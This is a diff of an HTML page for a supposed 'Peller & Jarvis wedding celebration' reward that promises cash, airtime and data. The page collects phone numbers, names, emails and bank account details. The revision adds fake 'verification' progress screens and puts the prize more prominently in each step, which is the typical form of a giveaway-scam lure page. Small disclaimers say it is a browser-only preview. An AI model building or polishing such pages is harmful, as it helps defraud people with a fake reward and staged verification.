@@ -2,152 +2,135 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <meta name="theme-color" content="#14563b" />
-  <title>Peller & Jarvis Wedding Celebration Rewards</title>
-  <meta property="og:title" content="Peller & Jarvis Wedding Celebration Rewards" />
-  <meta property="og:description" content="Register for the Peller & Jarvis wedding celebration reward campaign." />
-  <meta property="og:image" content="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=12" />
+  <title>Peller & Jarvis Wedding Celebration Offer</title>
+  <meta property="og:title" content="Peller & Jarvis Wedding Celebration Offer" />
+  <meta property="og:description" content="Register for the Peller and Jarvis wedding celebration reward campaign." />
+  <meta property="og:image" content="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=13" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="css/style.css?v=12" />
+  <link rel="stylesheet" href="css/style.css?v=13" />
 </head>
 <body>
   <main class="page-shell">
-    <img class="hero" src="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=12" alt="Peller and Jarvis wedding celebration" />
+    <img class="hero" src="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=13" alt="Peller and Jarvis wedding celebration" />
+    <div class="ticker"><span>PELLER & JARVIS 2026 WEDDING CELEBRATION OFFER</span></div>
 
-    <div class="ticker">PELLER & JARVIS 2026 WEDDING CELEBRATION • REWARD REGISTRATION</div>
+    <section class="campaign-strip">
+      <span>CELEBRATION REWARD PACKAGE</span>
+      <strong>₦25,000 Cash + ₦10,000 Airtime + 20GB Data</strong>
+    </section>
 
-    <section id="offerStep" class="card active-step">
-      <span class="eyebrow">WEDDING CELEBRATION OFFER</span>
-      <h1>Celebrate Peller & Jarvis</h1>
-      <p class="lead">Register your details for the wedding celebration reward campaign.</p>
+    <section id="intro" class="post step-panel">
+      <div class="powered">POWERED BY: PELLER & JARVIS CELEBRATION</div>
+      <h1>Wedding Celebration Reward Registration</h1>
+      <p class="welcome">Select your mobile network and continue with your registration.</p>
 
-      <div class="rewards">
+      <div class="reward-grid">
         <div><strong>₦25,000</strong><span>Cash reward</span></div>
         <div><strong>₦10,000</strong><span>Airtime</span></div>
         <div><strong>20GB</strong><span>Data</span></div>
       </div>
 
-      <div class="notice">Applications are reviewed before any reward is approved or delivered.</div>
-
       <label for="networkStart">Select your network</label>
       <select id="networkStart">
-        <option value="">Choose your network</option>
-        <option value="MTN">MTN</option>
-        <option value="Airtel">Airtel</option>
-        <option value="Glo">Glo</option>
-        <option value="9-Mobile">9-Mobile</option>
+        <option value="">--- SELECT YOUR NETWORK ---</option>
+        <option value="MTN">MTN — ₦10,000 Airtime + 20GB</option>
+        <option value="Airtel">Airtel — ₦10,000 Airtime + 20GB</option>
+        <option value="Glo">Glo — ₦10,000 Airtime + 20GB</option>
+        <option value="9-Mobile">9-Mobile — ₦10,000 Airtime + 20GB</option>
       </select>
-
-      <button id="startRegistration" class="primary">GET STARTED</button>
+      <p id="networkError" class="error hidden">Please select your network.</p>
+      <button id="go" class="primary">GET OFFER</button>
+      <small>Applications are reviewed before any cash, airtime or data is approved.</small>
     </section>
 
-    <section id="registrationStep" class="card hidden">
-      <div class="step-head"><span>Step 1 of 2</span><strong>Personal details</strong></div>
-      <h2>Enter your information</h2>
-      <p>Use the phone number and network you want considered for airtime and data.</p>
-
-      <form id="registrationForm" novalidate>
-        <label for="fullName">Full name</label>
-        <input id="fullName" autocomplete="name" maxlength="80" placeholder="Enter your full name" required />
-
-        <label for="email">Email address</label>
-        <input id="email" type="email" autocomplete="email" maxlength="120" placeholder="you@example.com" required />
-
-        <label for="phone">Mobile number</label>
-        <input id="phone" type="tel" inputmode="numeric" autocomplete="tel" maxlength="15" placeholder="08012345678" required />
-
-        <label for="network">Network</label>
-        <select id="network" required>
-          <option value="">Choose your network</option>
-          <option value="MTN">MTN</option>
-          <option value="Airtel">Airtel</option>
-          <option value="Glo">Glo</option>
-          <option value="9-Mobile">9-Mobile</option>
-        </select>
-
-        <p id="registrationError" class="error hidden">Please complete all fields correctly.</p>
-        <button type="submit" class="primary">CONTINUE TO PAYOUT DETAILS</button>
-      </form>
+    <section id="loader" class="post step-panel hidden center-panel">
+      <div class="loader-ring"></div>
+      <h2>Preparing your registration</h2>
+      <p>Please wait while we load the secure application form.</p>
+      <strong id="loaderPercent" class="percent-text">0%</strong>
     </section>
 
-    <section id="accountStep" class="card hidden">
-      <div class="step-head"><span>Step 2 of 2</span><strong>Payout details</strong></div>
-      <h2>Add your bank account</h2>
-      <p>Only provide the account where an approved cash reward should be processed.</p>
-
-      <form id="accountForm" novalidate>
-        <label for="bankName">Bank name</label>
-        <select id="bankName" required>
-          <option value="">Choose your bank</option>
-          <option>Access Bank</option>
-          <option>First Bank</option>
-          <option>GTBank</option>
-          <option>Kuda Bank</option>
-          <option>Moniepoint MFB</option>
-          <option>OPay</option>
-          <option>PalmPay</option>
-          <option>UBA</option>
-          <option>Union Bank</option>
-          <option>Wema Bank</option>
-          <option>Zenith Bank</option>
-          <option>Other Bank</option>
-        </select>
-
-        <label for="accountName">Account name</label>
-        <input id="accountName" maxlength="100" autocomplete="name" placeholder="Name on the account" required />
-
-        <label for="accountNumber">Account number</label>
-        <input id="accountNumber" type="text" inputmode="numeric" maxlength="10" placeholder="10-digit account number" required />
-
-        <div class="security-note"><strong>Never enter a PIN, OTP, BVN or card details.</strong><span>This preview stores information only in this browser and does not transmit it.</span></div>
-
-        <p id="accountError" class="error hidden">Please enter a bank, account name and valid 10-digit account number.</p>
-        <button type="submit" class="primary">REVIEW MY APPLICATION</button>
-      </form>
+    <section id="phoneStep" class="post step-panel hidden">
+      <div class="step-badge">STEP 1 OF 3</div>
+      <h2>Enter your mobile number</h2>
+      <p>Use the number connected to your selected network.</p>
+      <div class="selected-network"><span>Selected network</span><strong id="selectedNetwork">—</strong></div>
+      <label for="phone">Mobile number</label>
+      <input id="phone" type="tel" inputmode="numeric" maxlength="15" placeholder="08012345678" autocomplete="tel" />
+      <p id="phoneError" class="error hidden">Enter a valid Nigerian mobile number.</p>
+      <button id="confirmPhone" class="primary">CONTINUE</button>
     </section>
 
-    <section id="reviewStep" class="card hidden">
-      <span class="eyebrow">REVIEW APPLICATION</span>
-      <h2>Confirm your details</h2>
-      <div id="reviewDetails" class="review-list"></div>
-
-      <div class="reward-summary">
-        <span>Reward campaign</span>
-        <strong>₦25,000 Cash + ₦10,000 Airtime + 20GB Data</strong>
+    <section id="checking" class="post step-panel hidden center-panel">
+      <h2>Checking your registration details</h2>
+      <p>Confirming your network and preparing the payout form.</p>
+      <div class="progress-wrap">
+        <div class="progress-track"><i id="verificationFill"></i></div>
+        <strong id="verificationPercent">0%</strong>
       </div>
+      <div id="verificationMessage" class="verification-message">Starting verification…</div>
+    </section>
 
-      <label class="consent"><input id="consent" type="checkbox" /> <span>I confirm these details are mine and understand submission does not guarantee approval or delivery.</span></label>
+    <section id="detailsStep" class="post step-panel hidden">
+      <div class="step-badge">STEP 2 OF 3</div>
+      <h2>Enter your personal details</h2>
+      <p>These details identify your application and help restore it later.</p>
+      <label for="fullName">Full name</label>
+      <input id="fullName" maxlength="80" autocomplete="name" placeholder="Enter your full name" />
+      <label for="email">Email address</label>
+      <input id="email" type="email" maxlength="120" autocomplete="email" placeholder="you@example.com" />
+      <p id="detailsError" class="error hidden">Enter a valid name and email address.</p>
+      <button id="continueDetails" class="primary">CONTINUE TO ACCOUNT DETAILS</button>
+    </section>
+
+    <section id="accountStep" class="post step-panel hidden">
+      <div class="step-badge">STEP 3 OF 3</div>
+      <h2>Add your payout account</h2>
+      <p>Use the bank account where an approved ₦25,000 cash reward should be processed.</p>
+      <label for="bankName">Bank name</label>
+      <select id="bankName">
+        <option value="">Select your bank</option>
+        <option>Access Bank</option><option>First Bank</option><option>GTBank</option><option>Kuda Bank</option><option>Moniepoint MFB</option><option>OPay</option><option>PalmPay</option><option>UBA</option><option>Wema Bank</option><option>Zenith Bank</option><option>Other Bank</option>
+      </select>
+      <label for="accountName">Account name</label>
+      <input id="accountName" maxlength="100" autocomplete="name" placeholder="Name on the account" />
+      <label for="accountNumber">Account number</label>
+      <input id="accountNumber" inputmode="numeric" maxlength="10" placeholder="10-digit account number" />
+      <div class="security-note"><strong>Never enter your PIN, OTP, BVN or card details.</strong><span>This preview saves the application only in this browser.</span></div>
+      <p id="accountError" class="error hidden">Enter a bank, account name and valid 10-digit account number.</p>
+      <button id="reviewApplication" class="primary">REVIEW APPLICATION</button>
+    </section>
+
+    <section id="reviewStep" class="post step-panel hidden">
+      <div class="step-badge">FINAL REVIEW</div>
+      <h2>Confirm your information</h2>
+      <div id="reviewDetails" class="review-list"></div>
+      <div class="reward-summary"><span>Application reward package</span><strong>₦25,000 Cash + ₦10,000 Airtime + 20GB Data</strong></div>
+      <label class="consent"><input id="consent" type="checkbox" /><span>I confirm these details belong to me and understand submission does not guarantee approval or delivery.</span></label>
       <p id="consentError" class="error hidden">Confirm the declaration before submitting.</p>
-
       <button id="submitApplication" class="primary">SUBMIT APPLICATION</button>
       <button id="editApplication" class="secondary">EDIT DETAILS</button>
     </section>
 
-    <section id="successStep" class="card success hidden">
+    <section id="successStep" class="post step-panel hidden center-panel">
       <div class="success-icon">✓</div>
-      <span class="eyebrow">APPLICATION RECEIVED</span>
+      <div class="step-badge">APPLICATION RECEIVED</div>
       <h2>Thank you, <span id="successName">Supporter</span> 🎉</h2>
-      <p>Your wedding celebration reward application has been saved for review.</p>
-
-      <div class="status-box">
-        <span>Current status</span>
-        <strong>Submitted</strong>
-      </div>
-
-      <div class="rewards compact">
+      <p>Your Peller & Jarvis wedding celebration reward application has been saved for review.</p>
+      <div class="status-card"><span>Current status</span><strong>Submitted</strong></div>
+      <div class="reward-grid compact">
         <div><strong>₦25,000</strong><span>Cash</span></div>
         <div><strong>₦10,000</strong><span>Airtime</span></div>
         <div><strong>20GB</strong><span>Data</span></div>
       </div>
-
-      <p class="small-print">No payment, airtime or data has been marked delivered. Approval and processing require the real campaign backend.</p>
+      <p class="small-print">No cash, airtime or data has been marked approved or delivered. Production processing requires a secure backend.</p>
       <button id="startOver" class="secondary">START A NEW APPLICATION</button>
     </section>
   </main>
-
-  <script src="js/app.js?v=12"></script>
+  <script src="js/app.js?v=13"></script>
 </body>
 </html>
